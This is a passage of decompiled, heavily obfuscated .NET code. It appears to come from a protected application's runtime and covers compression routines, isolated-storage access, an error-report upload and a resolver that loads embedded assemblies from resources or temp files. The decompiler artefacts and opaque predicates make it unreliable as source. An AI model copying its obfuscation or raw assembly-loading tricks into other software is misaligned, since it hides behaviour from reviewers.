      IntPtr index1;
      int num1;
      try
      {
        obj1.\u0001[obj1.\u0001] = (short) obj0;
        byte[] numArray2 = obj1.\u0002;
        \u0008.\u0002.\u0007 obj = obj1;
        int num2 = obj.\u0001;
        if (true)
          goto label_7;
label_2:
        obj.\u0001 = num2 + 1;
        int index2 = num1;
        int num3 = (int) (byte) (obj2 - 3);
        numArray2[index2] = (byte) num3;
        *(int*) voidPtr = \u0007.\u0004.\u0001(obj1, obj2 - 3);
        (numArray1 = obj1.\u0001.\u0001)[(int) (index1 = (IntPtr) *(int*) voidPtr)] = (short) ((int) numArray1[index1] + 1);
        if (*(int*) voidPtr >= 265 && *(int*) voidPtr < 285)
          obj1.\u0002 += (*(int*) voidPtr - 261) / 4;
        *(int*) ((IntPtr) voidPtr + 4) = \u0007.\u0004.\u0001(obj1, obj0 - 1);
        (numArray1 = obj1.\u0002.\u0001)[(int) (index1 = (IntPtr) *(int*) ((IntPtr) voidPtr + 4))] = (short) ((int) numArray1[index1] + 1);
        if (*(int*) ((IntPtr) voidPtr + 4) >= 4)
          obj1.\u0002 += *(int*) ((IntPtr) voidPtr + 4) / 2 - 1;
        *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) \u0007.\u0004.\u0001(obj1);
        goto label_9;
label_7:
        num1 = num2;
        goto label_2;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) num1;
        short[] numArray3 = numArray1;
        // ISSUE: variable of a boxed type
        __Boxed<IntPtr> local4 = (ValueType) index1;
        \u0008.\u0002.\u0007 obj = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local5 = (ValueType) obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local6 = (ValueType) obj2;
        \u0007.\u0004.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) numArray3, (object) local4, (object) obj, (object) local5, (object) local6);
        throw;
      }
label_9:
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 8);
    }

    static IsolatedStorageFileStream \u0001(
      [In] FileMode obj0,
      [In] string obj1,
      [In] FileAccess obj2)
    {
      IsolatedStorageFileStream storageFileStream;
      try
      {
        storageFileStream = new IsolatedStorageFileStream(obj1, obj0, obj2, FileShare.None, \u0005.\u0006.\u0001);
      }
      catch (Exception ex)
      {
        string str = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<FileMode> local1 = (System.Enum) obj0;
        // ISSUE: variable of a boxed type
        __Boxed<FileAccess> local2 = (System.Enum) obj2;
        \u0007.\u0004.\u0001(ex, (object) str, (object) local1, (object) local2);
        throw;
      }
      return storageFileStream;
    }

    static string \u0001() => \u0007.\u0004.\u0093(2720);

    static void \u0001([In] \u0002.\u0004 obj0, [In] object obj1, [In] EventArgs obj2)
    {
label_0:
      EventHandler eventHandler;
      if (true)
        eventHandler = obj0.\u0001;
      do
      {
        if (eventHandler != null)
        {
          if (true)
          {
            if (true)
              \u001E\u0002.\u007E\u008B\u0003((object) eventHandler, obj1, obj2);
          }
          else
            goto label_0;
        }
      }
      while (false);
    }

    static void \u0001([In] \u000E.\u0003 obj0, [In] bool obj1) => obj0.\u0004 = obj1;

    static bool \u0001([In] \u0005.\u0004 obj0) => obj0.\u0002;

    static unsafe bool \u0001([In] \u0008.\u0002.\u0008 obj0, [In] int obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(23);
      int num1;
      int index;
      int num2;
      short[] numArray;
      try
      {
        num1 = 128;
        *(int*) voidPtr = 128;
        numArray = obj0.\u0002;
        index = obj0.\u0005;
        *(int*) ((IntPtr) voidPtr + 4) = obj0.\u0005 + obj0.\u0003;
        *(int*) ((IntPtr) voidPtr + 8) = Math.Max(obj0.\u0003, 2);
        *(int*) ((IntPtr) voidPtr + 12) = Math.Max(obj0.\u0005 - 32506, 0);
        *(int*) ((IntPtr) voidPtr + 16) = obj0.\u0005 + 258 - 1;
        *(sbyte*) ((IntPtr) voidPtr + 20) = (sbyte) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 4) - 1];
        *(sbyte*) ((IntPtr) voidPtr + 21) = (sbyte) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 4)];
        if (*(int*) ((IntPtr) voidPtr + 8) >= 8)
          num1 >>= 2;
        if (*(int*) voidPtr > obj0.\u0006)
          *(int*) voidPtr = obj0.\u0006;
        do
        {
          if ((int) obj0.\u0001[obj1 + *(int*) ((IntPtr) voidPtr + 8)] == (int) *(byte*) ((IntPtr) voidPtr + 21) && (int) obj0.\u0001[obj1 + *(int*) ((IntPtr) voidPtr + 8) - 1] == (int) *(byte*) ((IntPtr) voidPtr + 20) && (int) obj0.\u0001[obj1] == (int) obj0.\u0001[index])
          {
            while ((int) obj0.\u0001[obj1 + 1] == (int) obj0.\u0001[index + 1])
            {
              num2 = obj1 + 2;
              index += 2;
              do
                ;
              while ((int) obj0.\u0001[++index] == (int) obj0.\u0001[++num2] && (int) obj0.\u0001[++index] == (int) obj0.\u0001[++num2] && (int) obj0.\u0001[++index] == (int) obj0.\u0001[++num2] && (int) obj0.\u0001[++index] == (int) obj0.\u0001[++num2] && (int) obj0.\u0001[++index] == (int) obj0.\u0001[++num2] && (int) obj0.\u0001[++index] == (int) obj0.\u0001[++num2] && (int) obj0.\u0001[++index] == (int) obj0.\u0001[++num2] && (int) obj0.\u0001[++index] == (int) obj0.\u0001[++num2] && index < *(int*) ((IntPtr) voidPtr + 16));
              if (index > *(int*) ((IntPtr) voidPtr + 4))
              {
                if (true)
                {
                  obj0.\u0002 = obj1;
                  *(int*) ((IntPtr) voidPtr + 4) = index;
                  *(int*) ((IntPtr) voidPtr + 8) = index - obj0.\u0005;
                  if (*(int*) ((IntPtr) voidPtr + 8) < *(int*) voidPtr)
                  {
                    *(sbyte*) ((IntPtr) voidPtr + 20) = (sbyte) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 4) - 1];
                    *(sbyte*) ((IntPtr) voidPtr + 21) = (sbyte) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 4)];
                  }
                  else
                    goto label_15;
                }
                else
                  continue;
              }
              index = obj0.\u0005;
              break;
            }
          }
        }
        while ((obj1 = (int) numArray[obj1 & (int) short.MaxValue] & (int) ushort.MaxValue) > *(int*) ((IntPtr) voidPtr + 12) && --num1 != 0);
label_15:
        obj0.\u0003 = Math.Min(*(int*) ((IntPtr) voidPtr + 8), obj0.\u0006);
        *(sbyte*) ((IntPtr) voidPtr + 22) = (sbyte) (obj0.\u0003 >= 3);
      }
      catch (Exception ex)
      {
        object[] objArray = new object[13]
        {
          (object) num1,
          (object) *(int*) voidPtr,
          (object) numArray,
          (object) index,
          (object) num2,
          (object) *(int*) ((IntPtr) voidPtr + 4),
          (object) *(int*) ((IntPtr) voidPtr + 8),
          (object) *(int*) ((IntPtr) voidPtr + 12),
          (object) *(int*) ((IntPtr) voidPtr + 16),
          (object) *(byte*) ((IntPtr) voidPtr + 20),
          (object) *(byte*) ((IntPtr) voidPtr + 21),
          (object) obj0,
          (object) obj1
        };
        \u0007.\u0004.\u0001(ex, objArray);
        throw;
      }
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 22);
    }

    static bool \u0001([In] \u0008.\u0002.\u0002 obj0)
    {
      bool flag;
      try
      {
        flag = obj0.\u0001 == obj0.\u0002;
      }
      catch (Exception ex)
      {
        \u0008.\u0002.\u0002 obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) obj);
        throw;
      }
      return flag;
    }

    [DllImport("kernel32.Dll", EntryPoint = "GetVersionEx")]
    static extern short \u0001([In] ref \u0002.\u0005.\u0001 obj0);

    static ulong[] \u0001([In] string obj0)
    {
      byte[] numArray1;
      ulong[] numArray2;
      IsolatedStorageFileStream storageFileStream1;
      try
      {
        storageFileStream1 = new IsolatedStorageFileStream(obj0, FileMode.OpenOrCreate, FileAccess.Read, FileShare.None, \u0005.\u0006.\u0001);
        try
        {
          if (true)
          {
            numArray1 = new byte[\u001F.\u007E\u0016\u0002((object) storageFileStream1)];
            if (true)
            {
              int num1 = \u0080.\u007E\u0018\u0002((object) storageFileStream1, numArray1, 0, numArray1.Length);
              if (true)
              {
                if (true)
                  num1 = numArray1.Length;
                else
                  goto label_12;
              }
              while (true)
              {
                int num2 = num1;
                while (true)
                {
                  int length = num2 / 8;
                  if (false)
                  {
                    num2 = length;
                  }
                  else
                  {
                    numArray2 = new ulong[length];
                    goto label_12;
                  }
                }
                num1 = num2;
              }
            }
            else
              goto label_16;
          }
label_12:
          \u001F\u0002.\u008C\u0003((Array) numArray1, 0, (Array) numArray2, 0, numArray1.Length);
        }
        finally
        {
          if (storageFileStream1 != null)
            \u0011.\u007E\u0015((object) storageFileStream1);
        }
label_16:
        return numArray2;
      }
      catch (Exception ex)
      {
        ulong[] numArray3 = numArray2;
        IsolatedStorageFileStream storageFileStream2 = storageFileStream1;
        byte[] numArray4 = numArray1;
        string str = obj0;
        \u0007.\u0004.\u0001(ex, (object) numArray3, (object) storageFileStream2, (object) numArray4, (object) str);
        throw;
      }
    }

    static void \u0001(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2,
      [In] byte[] obj3,
      [In] \u000E.\u0004 obj4,
      [In] \u0004.\u0003 obj5)
    {
      try
      {
        ReportingService reportingService1 = new ReportingService(obj5.\u0003);
        if (obj5.\u0001 != null)
        {
          \u007F\u0002 obj = \u007F\u0002.\u007E\u008E\u0003;
          ReportingService reportingService2 = reportingService1;
          IWebProxy webProxy = obj5.\u0001;
          if (true)
            obj((object) reportingService2, webProxy);
        }
        obj4(reportingService1.UploadReport2(obj5.\u0002, obj3, obj0, obj2, obj1));
      }
      catch (Exception ex)
      {
        obj4(\u0080\u0002.\u008F\u0003(\u0007.\u0004.\u0093(2741), \u0015.\u007E\u009C((object) ex)));
      }
    }

    static unsafe void \u0001([In] \u0008.\u0002.\u0007 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(20);
      int num;
      try
      {
        *(int*) voidPtr = 0;
        while (*(int*) voidPtr < obj0.\u0001)
        {
          *(int*) ((IntPtr) voidPtr + 4) = (int) obj0.\u0002[*(int*) voidPtr] & (int) byte.MaxValue;
          num = (int) obj0.\u0001[*(int*) voidPtr];
          if (num-- != 0)
          {
            *(int*) ((IntPtr) voidPtr + 8) = \u0007.\u0004.\u0001(obj0, *(int*) ((IntPtr) voidPtr + 4));
            \u0007.\u0004.\u0001(obj0.\u0001, *(int*) ((IntPtr) voidPtr + 8));
            *(int*) ((IntPtr) voidPtr + 12) = (*(int*) ((IntPtr) voidPtr + 8) - 261) / 4;
            if (*(int*) ((IntPtr) voidPtr + 12) > 0 && *(int*) ((IntPtr) voidPtr + 12) <= 5)
              \u0007.\u0004.\u0001(obj0.\u0001, *(int*) ((IntPtr) voidPtr + 4) & (1 << *(int*) ((IntPtr) voidPtr + 12)) - 1, *(int*) ((IntPtr) voidPtr + 12));
            *(int*) ((IntPtr) voidPtr + 16) = \u0007.\u0004.\u0001(obj0, num);
            \u0007.\u0004.\u0001(obj0.\u0002, *(int*) ((IntPtr) voidPtr + 16));
            *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 16) / 2 - 1;
            if (*(int*) ((IntPtr) voidPtr + 12) > 0)
              \u0007.\u0004.\u0001(obj0.\u0001, num & (1 << *(int*) ((IntPtr) voidPtr + 12)) - 1, *(int*) ((IntPtr) voidPtr + 12));
          }
          else
            \u0007.\u0004.\u0001(obj0.\u0001, *(int*) ((IntPtr) voidPtr + 4));
          *(int*) voidPtr = *(int*) voidPtr + 1;
        }
        \u0007.\u0004.\u0001(obj0.\u0001, 256);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) num;
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
        // ISSUE: variable of a boxed type
        __Boxed<int> local5 = (ValueType) *(int*) ((IntPtr) voidPtr + 12);
        // ISSUE: variable of a boxed type
        __Boxed<int> local6 = (ValueType) *(int*) ((IntPtr) voidPtr + 16);
        \u0008.\u0002.\u0007 obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) local6, (object) obj);
        throw;
      }
    }

    static Assembly \u0001()
    {
      Assembly assembly;
      try
      {
        assembly = global::\u0001.\u0001();
      }
      catch
      {
        assembly = (Assembly) null;
      }
      return assembly;
    }

    static void \u0001([In] \u0008.\u0002.\u000E obj0)
    {
      int num1;
      try
      {
        int num2 = obj0.\u0003;
label_1:
        if (true)
        {
          if (num2 > 0)
          {
            byte[] numArray = obj0.\u0001;
            \u0008.\u0002.\u000E obj = obj0;
            int num3;
            num1 = num3 = obj.\u0002;
            obj.\u0002 = num3 + 1;
            int index = num1;
            int num4 = (int) (byte) obj0.\u0001;
            numArray[index] = (byte) num4;
            goto label_9;
          }
          else
            goto label_5;
        }
label_3:
        if (true)
        {
          if (num2 > 8)
            goto label_10;
        }
        else
          goto label_1;
label_5:
        obj0.\u0001 = 0U;
        if (true)
        {
          obj0.\u0003 = 0;
          if (true)
            return;
          goto label_10;
        }
label_9:
        num2 = obj0.\u0003;
        goto label_3;
label_10:
        byte[] numArray1 = obj0.\u0001;
        \u0008.\u0002.\u000E obj1 = obj0;
        int num5;
        num1 = num5 = obj1.\u0002;
        obj1.\u0002 = num5 + 1;
        int index1 = num1;
        int num6 = (int) (byte) (obj0.\u0001 >> 8);
        numArray1[index1] = (byte) num6;
        goto label_5;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) num1;
        \u0008.\u0002.\u000E obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) local, (object) obj);
        throw;
      }
    }

    static void \u0001([In] \u0008.\u0002.\u000E obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
        obj0.\u0001 |= (uint) (obj1 << obj0.\u0003);
        obj0.\u0003 += obj2;
        if (obj0.\u0003 < 16)
          return;
        do
        {
          if (true)
            goto label_5;
label_2:
          continue;
label_5:
          byte[] numArray1 = obj0.\u0001;
          \u0008.\u0002.\u000E obj = obj0;
          int num2;
          num1 = num2 = obj.\u0002;
          obj.\u0002 = num2 + 1;
          int index1 = num1;
          int num3 = (int) (byte) obj0.\u0001;
          numArray1[index1] = (byte) num3;
          byte[] numArray2 = obj0.\u0001;
          num1 = obj0.\u0002++;
          int index2 = num1;
          int num4 = (int) (byte) (obj0.\u0001 >> 8);
          numArray2[index2] = (byte) num4;
          obj0.\u0001 >>= 16;
          goto label_2;
        }
        while (false);
        obj0.\u0003 -= 16;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num1;
        \u0008.\u0002.\u000E obj = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) obj2;
        \u0007.\u0004.\u0001(ex, (object) local1, (object) obj, (object) local2, (object) local3);
        throw;
      }
    }

    static void \u0001([In] \u0004.\u0002 obj0, [In] \u000F.\u0006 obj1, [In] string obj2, [In] string obj3)
    {
      \u0003.\u0006 obj4 = obj0.\u0001;
      \u0003.\u0006 obj5;
      if (true)
        obj5 = obj4;
      if (obj5 == null)
        return;
      obj5((object) obj0, new \u0001.\u0004(obj1, obj2, obj3));
    }

    static void \u0001()
    {
      try
      {
        try
        {
          do
          {
            string str = \u0080\u0002.\u008F\u0003(\u0007.\u0004.\u0093(2758), \u0015.\u007E\u009D((object) global::\u0002.\u0002()));
            if (true)
              goto label_3;
label_1:
            continue;
label_3:
            \u0001.\u0007.\u0001(str);
            goto label_1;
          }
          while (false);
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
        \u0007.\u0004.\u0001(ex);
        throw;
      }
    }

    static unsafe int \u0001([In] \u0008.\u0002.\u0003 obj0, [In] \u0008.\u0002.\u0002 obj1, [In] int obj2)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
      try
      {
        int val1 = obj2;
        int val2_1 = 32768;
        if (val2_1 != 0)
        {
          int val2_2 = val2_1 - obj0.\u0002;
          int num = Math.Min(val1, val2_2);
          val2_1 = \u0007.\u0004.\u0001(obj1);
          val1 = num;
        }
        int num1 = Math.Min(val1, val2_1);
        while (true)
        {
          obj2 = num1;
          int num2;
          do
          {
            *(int*) ((IntPtr) voidPtr + 4) = 32768 - obj0.\u0001;
            num2 = obj2;
            if (true)
            {
              int num3 = *(int*) ((IntPtr) voidPtr + 4);
              if (num2 > num3)
                goto label_4;
            }
            else
              goto label_2;
          }
          while (false);
          goto label_7;
label_2:
          num1 = num2;
        }
label_4:
        *(int*) voidPtr = \u0007.\u0004.\u0001(obj1, obj0.\u0001, obj0.\u0001, *(int*) ((IntPtr) voidPtr + 4));
        if (*(int*) voidPtr == *(int*) ((IntPtr) voidPtr + 4))
        {
          *(int*) voidPtr = *(int*) voidPtr + \u0007.\u0004.\u0001(obj1, obj0.\u0001, 0, obj2 - *(int*) ((IntPtr) voidPtr + 4));
          goto label_8;
        }
        else
          goto label_8;
label_7:
        *(int*) voidPtr = \u0007.\u0004.\u0001(obj1, obj0.\u0001, obj0.\u0001, obj2);
label_8:
        obj0.\u0001 = obj0.\u0001 + *(int*) voidPtr & (int) short.MaxValue;
        obj0.\u0002 += *(int*) voidPtr;
        *(int*) ((IntPtr) voidPtr + 8) = *(int*) voidPtr;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        \u0008.\u0002.\u0003 obj3 = obj0;
        \u0008.\u0002.\u0002 obj4 = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) obj2;
        \u0007.\u0004.\u0001(ex, (object) local1, (object) local2, (object) obj3, (object) obj4, (object) local3);
        throw;
      }
      return *(int*) ((IntPtr) voidPtr + 8);
    }

    static bool \u0001([In] string obj0, [In] string obj1)
    {
      bool flag;
      IntPtr num1;
      try
      {
        if (true)
        {
          num1 = \u0007.\u0004.\u0001(obj0);
          int num2;
          for (int index = \u0081\u0002.\u0091\u0003(num1, IntPtr.Zero) ? 1 : 0; index == 0; index = num2)
          {
            num2 = \u0081\u0002.\u0092\u0003(\u0007.\u0004.\u0001(num1, obj1), IntPtr.Zero) ? 1 : 0;
            if (true)
            {
              flag = num2 != 0;
              goto label_8;
            }
          }
          flag = false;
        }
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<IntPtr> local = (ValueType) num1;
        string str1 = obj0;
        string str2 = obj1;
        \u0007.\u0004.\u0001(ex, (object) local, (object) str1, (object) str2);
        throw;
      }
label_8:
      return flag;
    }

    static void \u0001([In] \u0008.\u0002.\u000E obj0, [In] int obj1)
    {
      int num1;
      try
      {
        byte[] numArray1 = obj0.\u0001;
        \u0008.\u0002.\u000E obj2 = obj0;
        int num2;
        num1 = num2 = obj2.\u0002;
        obj2.\u0002 = num2 + 1;
        int index1 = num1;
        int num3 = (int) (byte) obj1;
        numArray1[index1] = (byte) num3;
        byte[] numArray2 = obj0.\u0001;
        \u0008.\u0002.\u000E obj3 = obj0;
        int num4;
        num1 = num4 = obj3.\u0002;
        obj3.\u0002 = num4 + 1;
        int index2 = num1;
        int num5 = (int) (byte) (obj1 >> 8);
        numArray2[index2] = (byte) num5;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num1;
        \u0008.\u0002.\u000E obj = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) obj1;
        \u0007.\u0004.\u0001(ex, (object) local1, (object) obj, (object) local2);
        throw;
      }
    }

    static unsafe int \u0001([In] string obj0, [In] \u0002.\u0003 obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(18);
      try
      {
        *(sbyte*) ((IntPtr) voidPtr + 16) = (sbyte) (obj1.\u0001[0] == '\u0001');
        if (true)
          goto label_26;
label_8:
        *(int*) ((IntPtr) voidPtr + 4) = \u0083.\u007E\u0080\u0002((object) obj0) - 1;
        goto label_24;
label_17:
        int num1 = *(int*) ((IntPtr) voidPtr + 8);
label_18:
        int num2 = obj1.\u0001.Length;
        int num3;
        while (true)
        {
          num3 = num2;
          if (false)
            num2 = num3;
          else
            break;
        }
        char ch;
        if (num1 < num3)
        {
          if ((int) obj1.\u0001[*(int*) ((IntPtr) voidPtr + 8)] == (int) ch)
          {
            *(int*) voidPtr = *(int*) voidPtr * obj1.\u0001.Length + *(int*) ((IntPtr) voidPtr + 8);
            *(sbyte*) ((IntPtr) voidPtr + 17) = (sbyte) 1;
          }
          else
          {
            *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + 1;
            goto label_17;
          }
        }
        if (*(sbyte*) ((IntPtr) voidPtr + 17) == (sbyte) 0)
        {
          *(int*) ((IntPtr) voidPtr + 12) = -1;
          goto label_29;
        }
        else
          *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) - 1;
label_24:
        while (*(int*) ((IntPtr) voidPtr + 4) >= 0)
        {
          if (true)
          {
            if (*(sbyte*) ((IntPtr) voidPtr + 16) != (sbyte) 0 || *(int*) ((IntPtr) voidPtr + 4) != 0)
            {
              ch = \u0082\u0002.\u007E\u0093\u0003((object) obj0, *(int*) ((IntPtr) voidPtr + 4));
              *(sbyte*) ((IntPtr) voidPtr + 17) = (sbyte) 0;
            }
            else
              break;
          }
          *(int*) ((IntPtr) voidPtr + 8) = 0;
          if (true)
            goto label_17;
        }
        *(int*) ((IntPtr) voidPtr + 12) = *(int*) voidPtr;
        goto label_29;
label_26:
        switch (obj0)
        {
          case null:
            if (true)
            {
              *(int*) ((IntPtr) voidPtr + 12) = -1;
              goto label_29;
            }
            else
              break;
          default:
            if (\u0083.\u007E\u0080\u0002((object) obj0) != 0)
            {
              if (true)
              {
                int num4 = (int) *(sbyte*) ((IntPtr) voidPtr + 16);
                if (true)
                {
                  if (num4 != 0 && \u0083.\u007E\u0080\u0002((object) obj0) > 4 || *(sbyte*) ((IntPtr) voidPtr + 16) == (sbyte) 0 && \u0082\u0002.\u007E\u0093\u0003((object) obj0, 0) != '#')
                    goto case null;
                  else
                    break;
                }
                else
                {
                  num1 = num4;
                  goto label_18;
                }
              }
              else
                goto label_24;
            }
            else
              goto case null;
        }
        *(int*) voidPtr = 0;
        goto label_8;
      }
      catch
      {
        *(int*) ((IntPtr) voidPtr + 12) = -1;
      }
label_29:
      return *(int*) ((IntPtr) voidPtr + 12);
    }

    static bool \u0001([In] \u0008.\u0002.\u000E obj0)
    {
      bool flag;
      try
      {
        do
        {
          flag = obj0.\u0002 == 0;
        }
        while (false);
      }
      catch (Exception ex)
      {
        \u0008.\u0002.\u000E obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) obj);
        throw;
      }
      return flag;
    }

    static void \u0001([In] int obj0, [In] \u0008.\u0002.\u000F obj1)
    {
      try
      {
        do
        {
          \u0007.\u0004.\u0001(obj0, obj1);
          \u0007.\u0004.\u0001(obj0 >> 16, obj1);
        }
        while (false);
      }
      catch (Exception ex)
      {
        \u0008.\u0002.\u000F obj = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) obj0;
        \u0007.\u0004.\u0001(ex, (object) obj, (object) local);
        throw;
      }
    }

    static unsafe Assembly \u0001(object _param0, ResolveEventArgs _param1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(18);
      \u0006.\u0001.\u0001 obj;
      string base64String;
      char[] chArray;
      string[] strArray;
      string str1;
      string str2;
      Hashtable hashtable;
      Assembly assembly1;
      Stream manifestResourceStream;
      byte[] numArray;
      Assembly assembly2;
      string path1;
      string path2;
      FileStream fileStream;
      string s;
      try
      {
        obj = new \u0006.\u0001.\u0001(_param1.Name);
        s = obj.\u0001(false);
        base64String = Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
        chArray = new char[1]{ ',' };
        strArray = "ezg4Y2E3NzVlLTc2NWMtNGI2NS1iNzIzLTdkNWRjY2I3YjU5NH0sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{856aca88-7b6e-451e-8618-1eb41836b526},ezg4Y2E3NzVlLTc2NWMtNGI2NS1iNzIzLTdkNWRjY2I3YjU5NH0=,[z]{856aca88-7b6e-451e-8618-1eb41836b526}".Split(chArray);
        str1 = string.Empty;
        *(sbyte*) ((IntPtr) voidPtr + 16) = (sbyte) 0;
        *(sbyte*) ((IntPtr) voidPtr + 17) = (sbyte) 0;
        *(int*) voidPtr = 0;
        while (*(int*) voidPtr < strArray.Length - 1)
        {
          if (strArray[*(int*) voidPtr] == base64String)
          {
            str1 = strArray[*(int*) voidPtr + 1];
            break;
          }
          *(int*) voidPtr = *(int*) voidPtr + 2;
        }
        if (str1.Length == 0 && obj.\u0003.Length == 0)
        {
          base64String = Convert.ToBase64String(Encoding.UTF8.GetBytes(obj.\u0001));
          *(int*) ((IntPtr) voidPtr + 4) = 0;
          while (*(int*) ((IntPtr) voidPtr + 4) < strArray.Length - 1)
          {
            if (strArray[*(int*) ((IntPtr) voidPtr + 4)] == base64String)
            {
              str1 = strArray[*(int*) ((IntPtr) voidPtr + 4) + 1];
              break;
            }
            *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) + 2;
          }
        }
        if (str1.Length > 0)
        {
          if (str1[0] == '[')
          {
            *(int*) ((IntPtr) voidPtr + 8) = str1.IndexOf(']');
            str2 = str1.Substring(1, *(int*) ((IntPtr) voidPtr + 8) - 1);
            *(sbyte*) ((IntPtr) voidPtr + 16) = (sbyte) (str2.IndexOf('z') >= 0);
            *(sbyte*) ((IntPtr) voidPtr + 17) = (sbyte) (str2.IndexOf('t') >= 0);
            str1 = str1.Substring(*(int*) ((IntPtr) voidPtr + 8) + 1);
          }
          Monitor.Enter((object) (hashtable = \u0006.\u0001.\u0001));
          try
          {
            if (\u0006.\u0001.\u0001.ContainsKey((object) str1))
            {
              assembly1 = (Assembly) \u0006.\u0001.\u0001[(object) str1];
            }
            else
            {
              manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(str1);
              if (manifestResourceStream != null)
              {
                *(int*) ((IntPtr) voidPtr + 12) = (int) manifestResourceStream.Length;
                numArray = new byte[*(int*) ((IntPtr) voidPtr + 12)];
                manifestResourceStream.Read(numArray, 0, *(int*) ((IntPtr) voidPtr + 12));
                if (*(sbyte*) ((IntPtr) voidPtr + 16) != (sbyte) 0)
                  numArray = \u0007.\u0004.\u0001(numArray);
                assembly2 = (Assembly) null;
                if (*(sbyte*) ((IntPtr) voidPtr + 17) == (sbyte) 0)
                {
                  try
                  {
                    assembly2 = Assembly.Load(numArray);
                  }
                  catch (FileLoadException ex)
                  {
                    *(sbyte*) ((IntPtr) voidPtr + 17) = (sbyte) 1;
                  }
                  catch (BadImageFormatException ex)
                  {
                    *(sbyte*) ((IntPtr) voidPtr + 17) = (sbyte) 1;
                  }
                }
                if (*(sbyte*) ((IntPtr) voidPtr + 17) != (sbyte) 0)
                {
                  try
                  {
                    path1 = string.Format("{0}{1}\\", (object) Path.GetTempPath(), (object) str1);
                    Directory.CreateDirectory(path1);
                    path2 = path1 + obj.\u0001 + ".dll";
                    if (!System.IO.File.Exists(path2))
                    {
                      fileStream = System.IO.File.OpenWrite(path2);
                      fileStream.Write(numArray, 0, numArray.Length);
                      fileStream.Close();
                      \u0007.\u0004.\u0001(path2, (string) null, 4);
                      \u0007.\u0004.\u0001(path1, (string) null, 4);
                    }
                    assembly2 = Assembly.LoadFile(path2);
                  }
                  catch
                  {
                  }
                }
                \u0006.\u0001.\u0001[(object) str1] = (object) assembly2;
                assembly1 = assembly2;
              }
              else
                goto label_32;
            }
          }
          finally
          {
            Monitor.Exit((object) hashtable);
          }
          return assembly1;
        }
label_32:
        return (Assembly) null;
      }
      catch (Exception ex)
      {
        object[] objArray = new object[23]
        {
          (object) obj,
          (object) s,
          (object) base64String,
          (object) strArray,
          (object) str1,
          (object) (bool) *(sbyte*) ((IntPtr) voidPtr + 16),
          (object) (bool) *(sbyte*) ((IntPtr) voidPtr + 17),
          (object) *(int*) voidPtr,
          (object) *(int*) ((IntPtr) voidPtr + 4),
          (object) *(int*) ((IntPtr) voidPtr + 8),
          (object) str2,
          (object) manifestResourceStream,
          (object) *(int*) ((IntPtr) voidPtr + 12),
          (object) numArray,
          (object) assembly2,
          (object) path1,
          (object) path2,
          (object) fileStream,
          (object) assembly1,
          (object) chArray,
          (object) hashtable,
          _param0,
          (object) _param1
        };
        \u0007.\u0004.\u0001(ex, objArray);
        throw;
      }
    }

    static \u0003.\u0007 \u0001()
    {
      \u0003.\u0007 obj1;
      \u0003.\u0007 obj2;
      IDisposable disposable1;
      \u0003.\u0007 obj3;
      try
      {
        while (true)
        {
